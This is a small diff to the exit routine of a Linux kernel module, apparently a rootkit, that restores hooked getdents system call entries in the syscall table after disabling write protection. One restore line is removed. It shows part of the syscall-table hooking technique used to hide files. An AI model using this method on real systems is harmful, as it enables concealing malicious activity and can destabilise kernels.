@@ -114,7 +114,6 @@ static void lkm_exit(void)
     
     // Recover the original system call setting
     DISABLE_WRITE_PROTECTION;
-    syscall_table[__NR_getdents] = (unsigned long *)kernel_getdents;
     syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
     ENABLE_WRITE_PROTECTION;
 }
